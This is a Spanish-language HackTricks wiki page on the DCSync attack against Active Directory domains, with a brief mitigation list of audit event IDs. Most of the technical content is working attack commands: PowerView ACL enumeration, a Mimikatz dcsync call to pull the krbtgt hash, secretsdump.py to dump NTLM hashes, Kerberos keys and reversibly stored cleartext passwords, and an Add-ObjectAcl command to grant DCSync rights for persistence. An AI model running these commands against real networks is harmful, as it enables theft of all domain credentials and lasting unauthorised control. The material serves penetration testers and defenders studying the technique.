# DCSync

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas comunitarias **más avanzadas** del mundo.\
Obtén Acceso Hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprende hacking de AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## DCSync

El permiso **DCSync** implica tener estos permisos sobre el dominio en sí: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** y **Replicating Directory Changes In Filtered Set**.

**Notas Importantes sobre DCSync:**

* El ataque **DCSync simula el comportamiento de un Controlador de Dominio y solicita a otros Controladores de Dominio que repliquen información** utilizando el Protocolo Remoto de Servicio de Replicación de Directorios (MS-DRSR). Dado que MS-DRSR es una función válida y necesaria de Active Directory, no se puede desactivar o inhabilitar.
* Por defecto, solo los grupos **Domain Admins, Enterprise Admins, Administrators y Domain Controllers** tienen los privilegios requeridos.
* Si alguna contraseña de cuenta está almacenada con cifrado reversible, Mimikatz ofrece una opción para devolver la contraseña en texto claro.

### Enumeración

Verifica quién tiene estos permisos utilizando `powerview`:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Explotar Localmente
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Explotar de Forma Remota
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` genera 3 archivos:

* uno con los **hashes NTLM**
* uno con las **claves Kerberos**
* uno con contraseñas en texto claro del NTDS para cualquier cuenta configurada con [**cifrado reversible**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) \*\*\*\* activado. Puedes obtener usuarios con cifrado reversible con

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistencia

Si eres un administrador de dominio, puedes otorgar estos permisos a cualquier usuario con la ayuda de `powerview`:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Luego, puedes **verificar si al usuario se le asignaron correctamente** los 3 privilegios buscándolos en la salida de (deberías poder ver los nombres de los privilegios dentro del campo "ObjectType"):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigación

* ID de evento de seguridad 4662 (Debe estar habilitada la política de auditoría para el objeto) – Se realizó una operación en un objeto
* ID de evento de seguridad 5136 (Debe estar habilitada la política de auditoría para el objeto) – Se modificó un objeto del servicio de directorio
* ID de evento de seguridad 4670 (Debe estar habilitada la política de auditoría para el objeto) – Se cambiaron los permisos en un objeto
* AD ACL Scanner - Crear y comparar informes de ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Referencias

* [https://www.ired.team/experimentos-de-seguridad-ofensiva/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/experimentos-de-seguridad-ofensiva/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas comunitarias **más avanzadas** del mundo.\
Obtén acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
